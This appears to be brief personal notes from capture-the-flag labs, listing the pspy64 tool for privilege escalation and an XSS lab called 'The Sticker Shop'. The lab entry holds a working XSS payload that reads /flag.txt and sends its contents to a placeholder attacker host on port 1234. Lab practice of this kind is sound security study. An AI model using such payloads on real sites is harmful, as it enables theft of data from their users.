# UnPrivilage

- pspy64
  
# XSS Labs

- The Sticker Shop
      - Flask 3.0.1
      - <script>fetch('/flag.txt').then(r => r.text()).then(d => {new Image().src = 'http://<your-ip>:1234/log?flag=' + encodeURIComponent(d);});</script>
